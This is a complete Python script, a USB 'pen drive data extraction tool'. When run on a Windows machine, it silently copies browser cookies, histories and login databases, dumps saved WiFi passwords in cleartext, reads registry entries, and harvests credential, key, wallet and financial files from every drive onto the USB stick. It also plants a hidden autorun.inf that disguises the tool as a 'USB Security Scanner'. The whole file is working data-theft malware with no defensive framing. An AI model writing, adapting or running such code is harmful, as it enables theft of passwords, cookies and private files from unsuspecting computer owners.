#!/usr/bin/env python3
"""
PEN DRIVE DATA EXTRACTION TOOL
Runs automatically from USB and extracts sensitive data to the USB drive
"""

import os
import sys
import json
import re
import shutil
import hashlib
import sqlite3
import zipfile
import csv
import time
import mimetypes
import base64
from datetime import datetime
from pathlib import Path
import winreg  # For Windows registry

# ============================================================================
# CONFIGURATION - AUTO-CONFIGURED FOR USB
# ============================================================================

def get_usb_drive():
    """Get the USB drive letter where this script is running"""
    if hasattr(sys, 'frozen'):  # PyInstaller executable
        script_path = sys.executable
    else:
        script_path = os.path.abspath(__file__)
    
    usb_drive = os.path.splitdrive(script_path)[0] + "\\"
    return usb_drive

# USB drive detection
USB_DRIVE = get_usb_drive()
EXTRACTION_FOLDER = os.path.join(USB_DRIVE, "Extracted_Data")
LOGS_FOLDER = os.path.join(USB_DRIVE, "Logs")

# What to extract - ALL sensitive file types
SENSITIVE_EXTENSIONS = {
    # Documents
    '.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.csv', '.rtf',
    '.ppt', '.pptx', '.odt', '.ods', '.odp',
    
    # Data files
    '.sql', '.db', '.sqlite', '.sqlite3', '.mdb', '.accdb', '.dbf',
    '.json', '.xml', '.yaml', '.yml', '.toml',
    
    # Configuration
    '.ini', '.cfg', '.conf', '.config', '.properties', '.env',
    '.reg', '.bat', '.cmd', '.ps1', '.sh', '.bash',
    
    # Security/Credentials
    '.pem', '.key', '.crt', '.cer', '.pfx', '.p12', '.p7b', '.kdbx',
    '.asc', '.gpg', '.pgp', '.ovpn', '.ppk',
    
    # Archives
    '.zip', '.rar', '.7z', '.tar', '.gz', '.tgz', '.bz2',
    
    # Logs
    '.log', '.bak', '.backup', '.old',
    
    # Media (might contain metadata)
    '.jpg', '.jpeg', '.png', '.bmp', '.mp3', '.mp4', '.avi', '.mov',
    
    # Other
    '.html', '.htm', '.php', '.js', '.py', '.java', '.c', '.cpp'
}

# Keywords to search in filenames
SENSITIVE_KEYWORDS = [
    'password', 'passwd', 'secret', 'key', 'credential', 'token',
    'auth', 'login', 'user', 'admin', 'root', 'private',
    'confidential', 'sensitive', 'hidden', 'secure', 'vault',
    'bank', 'account', 'financial', 'tax', 'salary', 'invoice',
    'wallet', 'bitcoin', 'crypto', 'database', 'backup',
    'config', 'setting', 'profile', 'history', 'cookie',
    'personal', 'identity', 'ssn', 'passport', 'license'
]

# Directories to always scan (regardless of drive)
COMMON_USER_PATHS = [
    os.path.expanduser('~\\Desktop'),
    os.path.expanduser('~\\Documents'),
    os.path.expanduser('~\\Downloads'),
    os.path.expanduser('~\\Pictures'),
    os.path.expanduser('~\\Videos'),
    os.path.expanduser('~\\Music'),
    os.path.expanduser('~\\OneDrive'),
    os.path.expanduser('~\\Google Drive'),
    os.path.expanduser('~\\Dropbox'),
    'C:\\Users\\Public\\Documents',
    'C:\\Users\\Public\\Desktop',
    'C:\\Users\\Public\\Downloads',
]

# Directories to skip (for performance and privacy)
SKIP_DIRECTORIES = [
    'Windows', 'Program Files', 'Program Files (x86)', 
    '$Recycle.Bin', 'System Volume Information',
    'AppData', 'Local Settings', 'Temp', 'tmp',
    'Tor Browser', 'cache', 'Cache'
]

# ============================================================================
# UTILITY FUNCTIONS
# ============================================================================

def setup_usb_folders():
    """Create necessary folders on USB drive"""
    folders = [
        EXTRACTION_FOLDER,
        LOGS_FOLDER,
        os.path.join(EXTRACTION_FOLDER, 'Documents'),
        os.path.join(EXTRACTION_FOLDER, 'Credentials'),
        os.path.join(EXTRACTION_FOLDER, 'Databases'),
        os.path.join(EXTRACTION_FOLDER, 'Configurations'),
        os.path.join(EXTRACTION_FOLDER, 'Archives'),
        os.path.join(EXTRACTION_FOLDER, 'Browser_Data'),
        os.path.join(EXTRACTION_FOLDER, 'System_Info'),
        os.path.join(EXTRACTION_FOLDER, 'Registry'),
        os.path.join(EXTRACTION_FOLDER, 'Network'),
        os.path.join(EXTRACTION_FOLDER, 'Logs'),
        os.path.join(EXTRACTION_FOLDER, 'Other')
    ]
    
    for folder in folders:
        os.makedirs(folder, exist_ok=True)
    
    return EXTRACTION_FOLDER

def get_all_drives():
    """Get all available drives on the system"""
    drives = []
    if os.name == 'nt':  # Windows
        import string
        from ctypes import windll
        
        bitmask = windll.kernel32.GetLogicalDrives()
        for letter in string.ascii_uppercase:
            if bitmask & 1:
                drive_path = letter + ":\\"
                # Don't scan the USB drive itself to avoid loops
                if not drive_path.lower().startswith(USB_DRIVE.lower()):
                    drives.append(drive_path)
            bitmask >>= 1
    else:  # Linux/Mac
        drives = ['/']  # Root directory
    
    return drives

def should_extract_file(filepath, filename):
    """Check if a file should be extracted"""
    filename_lower = filename.lower()
    
    # Check extension
    _, ext = os.path.splitext(filename_lower)
    if ext in SENSITIVE_EXTENSIONS:
        return True, f"extension:{ext}"
    
    # Check keywords in filename
    for keyword in SENSITIVE_KEYWORDS:
        if keyword in filename_lower:
            return True, f"keyword:{keyword}"
    
    # Check file size (skip too small or too large)
    try:
        size = os.path.getsize(filepath)
        if size < 100:  # Skip files smaller than 100 bytes
            return False, "too_small"
        if size > 100 * 1024 * 1024:  # Skip files larger than 100MB
            return False, "too_large"
    except:
        return False, "size_check_failed"
    
    return False, None

def calculate_hash(filepath):
    """Calculate SHA256 hash of a file"""
    sha256 = hashlib.sha256()
    try:
        with open(filepath, 'rb') as f:
            for chunk in iter(lambda: f.read(4096), b""):
                sha256.update(chunk)
        return sha256.hexdigest()
    except:
        return None

# ============================================================================
# EXTRACTION MODULES
# ============================================================================

def extract_browser_data():
    """Extract data from web browsers"""
    browser_data = {}
    
    # Browser paths
    browser_paths = {
        'Chrome': os.path.expanduser('~\\AppData\\Local\\Google\\Chrome\\User Data'),
        'Edge': os.path.expanduser('~\\AppData\\Local\\Microsoft\\Edge\\User Data'),
        'Firefox': os.path.expanduser('~\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles'),
        'Brave': os.path.expanduser('~\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data'),
        'Opera': os.path.expanduser('~\\AppData\\Roaming\\Opera Software\\Opera Stable'),
    }
    
    for browser_name, browser_path in browser_paths.items():
        if os.path.exists(browser_path):
            browser_output = os.path.join(EXTRACTION_FOLDER, 'Browser_Data', browser_name)
            os.makedirs(browser_output, exist_ok=True)
            
            copied_files = []
            for root, dirs, files in os.walk(browser_path):
                for file in files:
                    if any(x in file.lower() for x in ['history', 'cookies', 'logins', 'bookmarks', 'web data', 'form history']):
                        src = os.path.join(root, file)
                        rel_path = os.path.relpath(src, browser_path)
                        dst = os.path.join(browser_output, rel_path)
                        os.makedirs(os.path.dirname(dst), exist_ok=True)
                        
                        try:
                            shutil.copy2(src, dst)
                            copied_files.append(rel_path)
                        except:
                            pass
            
            browser_data[browser_name] = {
                'path': browser_path,
                'files_copied': len(copied_files),
                'status': 'success'
            }
    
    # Save browser data summary
    summary_path = os.path.join(EXTRACTION_FOLDER, 'Browser_Data', 'browser_summary.json')
    with open(summary_path, 'w') as f:
        json.dump(browser_data, f, indent=2)
    
    return browser_data

def extract_system_info():
    """Extract system information"""
    system_info = {}
    
    # Basic system info
    system_info['timestamp'] = datetime.now().isoformat()
    system_info['usb_drive'] = USB_DRIVE
    system_info['computer_name'] = os.environ.get('COMPUTERNAME', 'Unknown')
    system_info['username'] = os.environ.get('USERNAME', 'Unknown')
    
    # Environment variables (limited to non-sensitive ones)
    env_vars = {}
    for key, value in list(os.environ.items())[:20]:  # First 20
        if not any(sensitive in key.lower() for sensitive in ['pass', 'key', 'secret', 'token']):
            env_vars[key] = value
    system_info['environment'] = env_vars
    
    # Network information
    try:
        import socket
        system_info['hostname'] = socket.gethostname()
        system_info['ip_address'] = socket.gethostbyname(socket.gethostname())
    except:
        system_info['network_info'] = 'unavailable'
    
    # Copy important system files
    system_files = [
        ('C:\\Windows\\System32\\drivers\\etc\\hosts', 'hosts.txt'),
        ('C:\\Windows\\System32\\drivers\\etc\\networks', 'networks.txt'),
    ]
    
    for src, dst_name in system_files:
        if os.path.exists(src):
            try:
                dst = os.path.join(EXTRACTION_FOLDER, 'System_Info', dst_name)
                shutil.copy2(src, dst)
                system_info[dst_name] = 'copied'
            except:
                pass
    
    # Save system info
    info_path = os.path.join(EXTRACTION_FOLDER, 'System_Info', 'system_info.json')
    with open(info_path, 'w') as f:
        json.dump(system_info, f, indent=2)
    
    return system_info

def extract_wifi_passwords():
    """Extract saved WiFi passwords (Windows)"""
    if os.name != 'nt':
        return {}
    
    wifi_info = []
    try:
        import subprocess
        
        # Get WiFi profiles
        profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors='ignore')
        profile_names = re.findall(r'All User Profile\s*:\s*(.*)', profiles)
        
        for profile in profile_names:
            profile = profile.strip()
            try:
                # Get password for this profile
                results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear']).decode('utf-8', errors='ignore')
                password = re.findall(r'Key Content\s*:\s*(.*)', results)
                
                if password:
                    wifi_info.append({
                        'ssid': profile,
                        'password': password[0].strip()
                    })
            except:
                continue
        
        # Save WiFi info
        wifi_path = os.path.join(EXTRACTION_FOLDER, 'Network', 'wifi_passwords.json')
        with open(wifi_path, 'w') as f:
            json.dump(wifi_info, f, indent=2)
        
        return {'wifi_networks': len(wifi_info), 'status': 'extracted'}
    except:
        return {'status': 'failed'}

def extract_windows_registry():
    """Extract important Windows registry entries"""
    if os.name != 'nt':
        return {}
    
    registry_data = {}
    important_keys = [
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run"),
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"),
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Internet Settings"),
        (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs"),
    ]
    
    for hive, key_path in important_keys:
        try:
            key_name = key_path.split('\\')[-1]
            export_path = os.path.join(EXTRACTION_FOLDER, 'Registry', f"{key_name}.txt")
            
            with open(export_path, 'w', encoding='utf-8') as f:
                f.write(f"Registry Key: {key_path}\n")
                f.write("=" * 60 + "\n")
                
                key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_READ)
                i = 0
                while True:
                    try:
                        name, value, type_val = winreg.EnumValue(key, i)
                        f.write(f"{name}: {value}\n")
                        i += 1
                    except OSError:
                        break
                winreg.CloseKey(key)
            
            registry_data[key_path] = export_path
        except Exception as e:
            registry_data[key_path] = f"Error: {str(e)}"
    
    return registry_data

def extract_file_content(filepath, filename):
    """Extract and analyze file content"""
    result = {
        'filename': filename,
        'path': filepath,
        'size': os.path.getsize(filepath),
        'hash': calculate_hash(filepath),
        'extracted_time': datetime.now().isoformat()
    }
    
    try:
        # Try to read text content
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            content = f.read(50000)  # Read first 50KB
        
        # Look for sensitive patterns
        patterns = {
            'emails': r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b',
            'urls': r'https?://[^\s]+',
            'ip_addresses': r'\b(?:\d{1,3}\.){3}\d{1,3}\b',
            'credit_cards': r'\b(?:\d[ -]*?){13,16}\b',
            'api_keys': r'(?i)(api[_-]?key|secret[_-]?key)[:=]\s*[\'"]?([A-Za-z0-9]{20,})[\'"]?',
        }
        
        findings = {}
        for name, pattern in patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE)
            if matches:
                # Clean and deduplicate matches
                clean_matches = list(set([m[1] if isinstance(m, tuple) else m for m in matches]))
                findings[name] = clean_matches[:10]  # Limit to 10 matches
        
        if findings:
            result['content_findings'] = findings
            
    except:
        # Binary file or unreadable
        pass
    
    return result

# ============================================================================
# MAIN SCANNING ENGINE
# ============================================================================

def scan_and_extract_drive(drive_path, max_depth=2):
    """Scan a drive and extract sensitive files"""
    extracted_files = []
    errors = []
    
    print(f"[*] Scanning drive: {drive_path}")
    
    try:
        for root, dirs, files in os.walk(drive_path):
            # Skip system directories
            dirs[:] = [d for d in dirs if d not in SKIP_DIRECTORIES and not d.startswith('.')]
            
            # Calculate depth
            depth = root[len(drive_path):].count(os.sep)
            if depth > max_depth:
                continue
            
            for filename in files:
                filepath = os.path.join(root, filename)
                
                try:
                    should_extract, reason = should_extract_file(filepath, filename)
                    
                    if should_extract:
                        # Determine category
                        if any(x in filename.lower() for x in ['password', 'secret', 'key', 'credential', 'token']):
                            category = 'Credentials'
                        elif filename.endswith(('.doc', '.docx', '.pdf', '.xls', '.xlsx', '.txt')):
                            category = 'Documents'
                        elif filename.endswith(('.db', '.sqlite', '.sql', '.mdb')):
                            category = 'Databases'
                        elif filename.endswith(('.ini', '.cfg', '.conf', '.config', '.env')):
                            category = 'Configurations'
                        elif filename.endswith(('.zip', '.rar', '.7z', '.tar')):
                            category = 'Archives'
                        else:
                            category = 'Other'
                        
                        # Create safe destination path
                        safe_filename = re.sub(r'[<>:"|?*]', '_', filename)
                        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                        unique_name = f"{timestamp}_{safe_filename}"
                        
                        dest_folder = os.path.join(EXTRACTION_FOLDER, category)
                        dest_path = os.path.join(dest_folder, unique_name)
                        
                        # Copy file
                        shutil.copy2(filepath, dest_path)
                        
                        # Extract additional info
                        file_info = extract_file_content(filepath, filename)
                        file_info['category'] = category
                        file_info['reason'] = reason
                        file_info['source_drive'] = drive_path
                        file_info['source_path'] = root
                        file_info['extracted_path'] = dest_path
                        
                        extracted_files.append(file_info)
                        
                        # Progress indicator
                        if len(extracted_files) % 10 == 0:
                            print(f"  [+] Extracted {len(extracted_files)} files...")
                            
                except Exception as e:
                    errors.append(f"{filename}: {str(e)}")
    
    except Exception as e:
        errors.append(f"Drive {drive_path}: {str(e)}")
    
    return extracted_files, errors

def scan_common_locations():
    """Scan common user locations"""
    all_files = []
    all_errors = []
    
    for location in COMMON_USER_PATHS:
        if os.path.exists(location):
            print(f"[*] Scanning location: {location}")
            files, errors = scan_and_extract_drive(location, max_depth=3)
            all_files.extend(files)
            all_errors.extend(errors)
    
    return all_files, all_errors

# ============================================================================
# MAIN EXECUTION
# ============================================================================

def create_autorun_inf():
    """Create autorun.inf for automatic execution"""
    inf_content = """[AutoRun]
open=extract.exe
icon=extract.exe
label=USB Security Scanner
action=Security Audit
shell\scan=Scan Computer
shell\scan\command=extract.exe
"""
    
    inf_path = os.path.join(USB_DRIVE, "autorun.inf")
    try:
        with open(inf_path, 'w') as f:
            f.write(inf_content)
        
        # Make it hidden
        import ctypes
        ctypes.windll.kernel32.SetFileAttributesW(inf_path, 2)  # Hidden
        return True
    except:
        return False

def main():
    """Main extraction process - runs automatically"""
    print("=" * 70)
    print("PEN DRIVE DATA EXTRACTION TOOL")
    print("=" * 70)
    print(f"USB Drive: {USB_DRIVE}")
    print(f"Start Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()
    
    # Step 1: Setup folders on USB
    print("[*] Setting up USB folders...")
    extraction_folder = setup_usb_folders()
    print(f"[+] Output folder: {extraction_folder}")
    
    # Step 2: Create autorun.inf for future runs
    if create_autorun_inf():
        print("[+] Created autorun.inf for automatic execution")
    
    # Step 3: Extract system information
    print("\n[*] Extracting system information...")
    system_info = extract_system_info()
    print(f"[+] System information extracted")
    
    # Step 4: Extract browser data
    print("\n[*] Extracting browser data...")
    browser_data = extract_browser_data()
    print(f"[+] Browser data from {len(browser_data)} browsers")
    
    # Step 5: Extract WiFi passwords (Windows only)
    if os.name == 'nt':
        print("\n[*] Extracting WiFi passwords...")
        wifi_info = extract_wifi_passwords()
        print(f"[+] WiFi passwords extracted")
    
    # Step 6: Extract Windows registry (Windows only)
    if os.name == 'nt':
        print("\n[*] Extracting Windows registry...")
        registry_data = extract_windows_registry()
        print(f"[+] Registry data extracted")
    
    # Step 7: Scan all drives
    print("\n" + "=" * 70)
    print("[*] Scanning all drives for sensitive files...")
    print("=" * 70)
    
    all_drives = get_all_drives()
    print(f"[+] Found {len(all_drives)} drives to scan")
    
    all_extracted_files = []
    all_errors = []
    
    for drive in all_drives:
        files, errors = scan_and_extract_drive(drive, max_depth=2)
        all_extracted_files.extend(files)
        all_errors.extend(errors)
        print(f"  [+] Drive {drive}: {len(files)} files extracted")
    
    # Step 8: Scan common user locations
    print("\n[*] Scanning common user locations...")
    user_files, user_errors = scan_common_locations()
    all_extracted_files.extend(user_files)
    all_errors.extend(user_errors)
    print(f"  [+] Common locations: {len(user_files)} files extracted")
    
    # Step 9: Generate comprehensive report
    print("\n" + "=" * 70)
    print("[*] Generating extraction report...")
    print("=" * 70)
    
    summary = {
        'extraction_timestamp': datetime.now().isoformat(),
        'usb_drive': USB_DRIVE,
        'output_folder': extraction_folder,
        'total_drives_scanned': len(all_drives),
        'total_files_extracted': len(all_extracted_files),
        'total_errors': len(all_errors),
        'system_info': system_info,
        'browser_data': browser_data,
        'wifi_info': wifi_info if os.name == 'nt' else 'N/A',
        'registry_data': registry_data if os.name == 'nt' else 'N/A',
        'files_by_category': {},
        'file_list': all_extracted_files,
        'errors': all_errors[:50]  # First 50 errors only
    }
    
    # Calculate files by category
    for file_info in all_extracted_files:
        category = file_info.get('category', 'Other')
        summary['files_by_category'][category] = summary['files_by_category'].get(category, 0) + 1
    
    # Save detailed report
    report_path = os.path.join(extraction_folder, "extraction_report.json")
    with open(report_path, 'w', encoding='utf-8') as f:
        json.dump(summary, f, indent=2, ensure_ascii=False, default=str)
    
    # Save simplified CSV report
    csv_path = os.path.join(extraction_folder, "extracted_files.csv")
    with open(csv_path, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['Timestamp', 'Filename', 'Category', 'Size', 'Hash', 'Source', 'Extracted Path'])
        
        for file_info in all_extracted_files:
            writer.writerow([
                file_info.get('extracted_time', ''),
                file_info.get('filename', ''),
                file_info.get('category', ''),
                file_info.get('size', ''),
                file_info.get('hash', ''),
                file_info.get('source_path', ''),
                file_info.get('extracted_path', '')
            ])
    
    # Save log file
    log_path = os.path.join(LOGS_FOLDER, f"extraction_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log")
    with open(log_path, 'w') as f:
        f.write(f"Extraction completed at: {datetime.now().isoformat()}\n")
        f.write(f"Total files extracted: {len(all_extracted_files)}\n")
        f.write(f"Total errors: {len(all_errors)}\n")
        f.write(f"USB Drive: {USB_DRIVE}\n")
        f.write(f"Output: {extraction_folder}\n")
    
    # Step 10: Display summary
    print("\n" + "=" * 70)
    print("EXTRACTION COMPLETE")
    print("=" * 70)
    print(f"Total Files Extracted: {len(all_extracted_files)}")
    print(f"Total Errors: {len(all_errors)}")
    print(f"Output Location: {extraction_folder}")
    print()
    print("Files by Category:")
    for category, count in summary['files_by_category'].items():
        print(f"  {category}: {count}")
    print()
    print(f"Report: {report_path}")
    print(f"CSV List: {csv_path}")
    print(f"Log File: {log_path}")
    print()
    
    # Show folder structure
    print("Extracted Data Structure:")
    for root, dirs, files in os.walk(extraction_folder):
        level = root.replace(extraction_folder, '').count(os.sep)
        indent = '  ' * level
        if level == 0:
            print(f"{indent}{os.path.basename(root)}/")
        elif level == 1:
            print(f"{indent}├── {os.path.basename(root)}/")
            # Show file count
            file_count = len([f for f in os.listdir(root) if os.path.isfile(os.path.join(root, f))])
            if file_count > 0:
                print(f"{indent}│   └── ({file_count} files)")
    
    print("\n" + "=" * 70)
    print("[*] Tool will exit in 15 seconds...")
    print("=" * 70)
    
    time.sleep(15)

# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == "__main__":
    try:
        # Small delay to ensure USB is ready
        time.sleep(2)
        
        # Run extraction
        main()
        
    except KeyboardInterrupt:
        print("\n[!] Extraction interrupted")
    except Exception as e:
        print(f"\n[!] Critical error: {str(e)}")
        import traceback
        traceback.print_exc()
        
        # Try to save error log
        try:
            error_log = os.path.join(LOGS_FOLDER, "error.log")
            with open(error_log, 'a') as f:
                f.write(f"\n[{datetime.now()}] Error: {str(e)}\n")
        except:
            pass
    finally:
        # Ensure clean exit
        sys.exit(0)